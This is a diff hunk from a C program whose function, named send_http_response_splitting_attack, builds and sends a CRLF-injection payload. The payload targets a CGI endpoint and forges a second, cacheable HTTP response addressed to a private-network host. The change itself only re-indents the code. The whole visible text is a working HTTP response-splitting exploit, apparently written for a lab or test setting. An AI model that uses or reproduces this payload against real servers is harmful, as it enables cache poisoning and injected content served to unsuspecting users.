@@ -75,27 +75,27 @@ void send_http_response_splitting_attack() {
 
     char injected2_response[RESPONSE_BUFFER_SIZE];
 
-snprintf(injected2_response, sizeof(injected2_response),
-         // First response
-        "GET /cgi-bin/course_selector?course_id=67607%%0d%%0a"
-         "Content-Type:%%20text/html%%0d%%0a"
-         "Content-Length:%%2018%%0d%%0a%%0d%%0a"
-         "<html>Hello</html>"
-         
-         // Second response
-         "HTTP/1.1%%20200%%20OK%%0d%%0a"
-         
-          "Last-Modified:%%20Sun,%%2019%%20Jan%%202025%%2019:07:00%%20GMT%%0d%%0a"
-         "Content-Type:%%20text/html%%0d%%0a"
-         "Content-Length:%%2039%%0d%%0a" // Matches "212973481" content size
-          "Cache-Control:%%20public,%%20max-age=3600%%0d%%0a"
-         "<!DOCTYPE%%20html>%%20<html>212973481</html>"
-          "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
-          "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n"
-          );
+    snprintf(injected2_response, sizeof(injected2_response),
+            // First response
+            "GET /cgi-bin/course_selector?course_id=67607%%0d%%0a"
+            "Content-Type:%%20text/html%%0d%%0a"
+            "Content-Length:%%2018%%0d%%0a%%0d%%0a"
+            "<html>Hello</html>"
+            
+            // Second response
+            "HTTP/1.1%%20200%%20OK%%0d%%0a"
+            
+            "Last-Modified:%%20Sun,%%2019%%20Jan%%202025%%2019:07:00%%20GMT%%0d%%0a"
+            "Content-Type:%%20text/html%%0d%%0a"
+            "Content-Length:%%2039%%0d%%0a" // Matches "212973481" content size
+            "Cache-Control:%%20public,%%20max-age=3600%%0d%%0a"
+            "<!DOCTYPE%%20html>%%20<html>212973481</html>"
+            "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
+            "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n"
+    );
 
          
-      if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
+    if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
         perror("Failed to send combined_response");
         close(sockfd);
         exit(EXIT_FAILURE);
